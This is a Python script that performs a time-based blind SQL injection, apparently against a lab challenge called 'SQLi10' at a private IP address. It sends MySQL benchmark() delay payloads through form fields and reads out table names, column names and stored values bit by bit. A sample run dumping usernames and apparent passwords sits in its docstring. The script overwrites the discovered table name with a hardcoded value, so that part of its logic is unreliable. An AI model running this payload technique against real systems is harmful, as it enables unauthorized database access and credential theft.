#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
$ ./blind_post_list_data.py -u http://172.28.128.3:8009/validate.php -p user_name password                  ⏎

notgivenatall
        * id
                -> 7,8,9,10,11
        * choucroute
                -> richard,admin,lance,marco,kaminsky
        * welldone
                -> leroilion,istrateurfou,etvachercher,panzanitani,gemelewisky

"""
import requests
import argparse


DEBUG = False
LOG = lambda name, var: DEBUG and print('{}: {}'.format(name, var))
SUBQUERIES = {
    # find the table name
    'table': """(select group_concat(table_name separator ',')
        from information_schema.tables where table_schema=database())""",
    # Find columns for a known table
    'columns': lambda table: """(select group_concat(column_name separator ',')
        from information_schema.columns where table_name='{}')""".format(table),
    # Find all values in a known table.column
    'values': lambda table, column: """(select group_concat({} separator ',')
        from {})""".format(column, table),
}
INJECTION = lambda subquery, i, shift, n: """' and
if((ascii(substring({},{},1))>>{})='{}', benchmark(100000,md5(char(1))),null)
#""".format(subquery, i, shift, n)


def main(url, payload_keys, subquery):
    s = requests.Session()
    result = ''
    while 1:
        i = len(result) + 1
        n = 0
        first = True
        for shift in reversed(range(8)):
            LOG('n', n)
            n = n << 1
            injection = INJECTION(subquery, i, shift, n)
            payload_values = [injection] + ['a'] * len(payload_keys)
            payload = dict(zip(payload_keys, payload_values))
            if first:
                LOG('payload', payload)
                first = False
            page = s.post(url, data=payload)
            secs = page.elapsed.total_seconds()
            n += 0 if secs > 0.02 and secs < 0.1 else 1
        if not n:
            return result
        result += chr(n)
        LOG('result', result)
        


def parse_args():
    global DEBUG
    parser = argparse.ArgumentParser(description='Blind Injection exploit for SQLi10')
    parser.add_argument('-u', '--url', action='store', dest='url', required=True,
        help='url to exploit, eg "http://172.28.128.3:8009/validate.php"')
    parser.add_argument('-p', '--payload', nargs='+', action='store', dest='payload',
        required=True, help='list of payload keys, eg "user_name password"')
    parser.add_argument('--debug', action='store_true', dest='debug',
        help='verbose print')
    args = parser.parse_args()
    DEBUG = args.debug
    return args


if __name__ == '__main__':
    args = parse_args()
    # Find table
    table = main(args.url, args.payload, SUBQUERIES['table'])
    table = 'notgivenatall'
    print(table)
    # Find columns 
    columns = main(args.url, args.payload, SUBQUERIES['columns'](table))
    for column in columns.split(','):
        print('\t* {}'.format(column))
        # Finally, dump the values in those columns
        values = main(args.url, args.payload,
            SUBQUERIES['values'](table, column))
        print ('\t\t-> {}'.format(values))

